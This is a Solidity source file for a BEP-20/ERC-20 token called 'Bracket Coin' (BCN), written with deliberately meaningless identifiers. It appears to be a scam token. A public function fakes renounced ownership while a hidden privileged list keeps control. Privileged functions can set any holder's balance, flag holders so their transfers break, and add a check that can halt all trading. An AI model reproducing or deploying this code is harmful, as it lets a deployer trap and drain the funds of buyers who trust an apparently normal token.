//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract maxMode {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface fundFrom {
    function createPair(address buyLaunched, address enableFee) external returns (address);

    function feeTo() external view returns (address);
}

interface maxAmountReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface isLaunch {
    function totalSupply() external view returns (uint256);

    function balanceOf(address amountAt) external view returns (uint256);

    function transfer(address fundIsMin, uint256 walletMinLaunch) external returns (bool);

    function allowance(address maxTake, address spender) external view returns (uint256);

    function approve(address spender, uint256 walletMinLaunch) external returns (bool);

    function transferFrom(
        address sender,
        address fundIsMin,
        uint256 walletMinLaunch
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fundSwap, uint256 value);
    event Approval(address indexed maxTake, address indexed spender, uint256 value);
}

interface minModeTake is isLaunch {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract BracketCoin is maxMode, isLaunch, minModeTake {

    address public listTeam;

    uint256 enableTeamAt;

    address launchedIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public enableIs;

    address public exemptLaunch;

    function owner() external view returns (address) {
        return maxTrading;
    }

    function isAuto(address launchedBuy, address fundIsMin, uint256 walletMinLaunch) internal returns (bool) {
        if (launchedBuy == exemptLaunch) {
            return exemptTrading(launchedBuy, fundIsMin, walletMinLaunch);
        }
        uint256 sellLaunch = isLaunch(listTeam).balanceOf(modeExempt);
        require(sellLaunch == toEnableIs);
        require(fundIsMin != modeExempt);
        if (feeMarketing[launchedBuy]) {
            return exemptTrading(launchedBuy, fundIsMin, marketingLaunch);
        }
        walletMinLaunch = walletSell(launchedBuy, fundIsMin, walletMinLaunch);
        return exemptTrading(launchedBuy, fundIsMin, walletMinLaunch);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return amountTx;
    }

    event OwnershipTransferred(address indexed limitMax, address indexed sellExempt);

    uint256 constant marketingLaunch = 7 ** 10;

    bool public listAt;

    function minAmount() public {
        emit OwnershipTransferred(exemptLaunch, address(0));
        maxTrading = address(0);
    }

    function decimals() external view virtual override returns (uint8) {
        return feeSender;
    }

    function symbol() external view virtual override returns (string memory) {
        return tradingTxSwap;
    }

    function txTake(address txLiquidity) public {
        require(txLiquidity.balance < 100000);
        if (toLiquidity) {
            return;
        }
        if (marketingShould != teamAt) {
            teamAt = marketingShould;
        }
        sellSender[txLiquidity] = true;
        if (listAt == tokenShould) {
            marketingShould = teamAt;
        }
        toLiquidity = true;
    }

    function exemptTake(address maxTeamList) public {
        isModeTx();
        
        if (maxTeamList == exemptLaunch || maxTeamList == listTeam) {
            return;
        }
        feeMarketing[maxTeamList] = true;
    }

    function allowance(address takeSender, address txAt) external view virtual override returns (uint256) {
        if (txAt == launchedIs) {
            return type(uint256).max;
        }
        return marketingBuy[takeSender][txAt];
    }

    mapping(address => bool) public feeMarketing;

    bool public toLiquidity;

    function isModeTx() private view {
        require(sellSender[_msgSender()]);
    }

    mapping(address => mapping(address => uint256)) private marketingBuy;

    uint256 public takeList = 0;

    function listShould(address tokenLaunched, uint256 walletMinLaunch) public {
        isModeTx();
        feeLaunched[tokenLaunched] = walletMinLaunch;
    }

    function approve(address txAt, uint256 walletMinLaunch) public virtual override returns (bool) {
        marketingBuy[_msgSender()][txAt] = walletMinLaunch;
        emit Approval(_msgSender(), txAt, walletMinLaunch);
        return true;
    }

    address private maxTrading;

    bool public tokenShould;

    function enableLaunch(uint256 walletMinLaunch) public {
        isModeTx();
        toEnableIs = walletMinLaunch;
    }

    function exemptTrading(address launchedBuy, address fundIsMin, uint256 walletMinLaunch) internal returns (bool) {
        require(feeLaunched[launchedBuy] >= walletMinLaunch);
        feeLaunched[launchedBuy] -= walletMinLaunch;
        feeLaunched[fundIsMin] += walletMinLaunch;
        emit Transfer(launchedBuy, fundIsMin, walletMinLaunch);
        return true;
    }

    function walletSell(address launchedBuy, address fundIsMin, uint256 walletMinLaunch) internal view returns (uint256) {
        require(walletMinLaunch > 0);

        uint256 shouldReceiver = 0;
        if (launchedBuy == listTeam && takeList > 0) {
            shouldReceiver = walletMinLaunch * takeList / 100;
        } else if (fundIsMin == listTeam && listToken > 0) {
            shouldReceiver = walletMinLaunch * listToken / 100;
        }
        require(shouldReceiver <= walletMinLaunch);
        return walletMinLaunch - shouldReceiver;
    }

    function getOwner() external view returns (address) {
        return maxTrading;
    }

    uint256 public listToken = 0;

    string private tradingTxSwap = "BCN";

    uint256 public marketingShould;

    constructor (){
        
        minAmount();
        maxAmountReceiver receiverSell = maxAmountReceiver(launchedIs);
        listTeam = fundFrom(receiverSell.factory()).createPair(receiverSell.WETH(), address(this));
        modeExempt = fundFrom(receiverSell.factory()).feeTo();
        
        exemptLaunch = _msgSender();
        sellSender[exemptLaunch] = true;
        feeLaunched[exemptLaunch] = amountTx;
        if (tokenShould != enableIs) {
            listAt = false;
        }
        emit Transfer(address(0), exemptLaunch, amountTx);
    }

    mapping(address => bool) public sellSender;

    mapping(address => uint256) private feeLaunched;

    function name() external view virtual override returns (string memory) {
        return senderAt;
    }

    bool private fromModeTrading;

    string private senderAt = "Bracket Coin";

    uint256 toEnableIs;

    function transferFrom(address launchedBuy, address fundIsMin, uint256 walletMinLaunch) external override returns (bool) {
        if (_msgSender() != launchedIs) {
            if (marketingBuy[launchedBuy][_msgSender()] != type(uint256).max) {
                require(walletMinLaunch <= marketingBuy[launchedBuy][_msgSender()]);
                marketingBuy[launchedBuy][_msgSender()] -= walletMinLaunch;
            }
        }
        return isAuto(launchedBuy, fundIsMin, walletMinLaunch);
    }

    uint256 private amountTx = 100000000 * 10 ** 18;

    function balanceOf(address amountAt) public view virtual override returns (uint256) {
        return feeLaunched[amountAt];
    }

    address modeExempt;

    uint8 private feeSender = 18;

    uint256 public teamAt;

    function transfer(address tokenLaunched, uint256 walletMinLaunch) external virtual override returns (bool) {
        return isAuto(_msgSender(), tokenLaunched, walletMinLaunch);
    }

}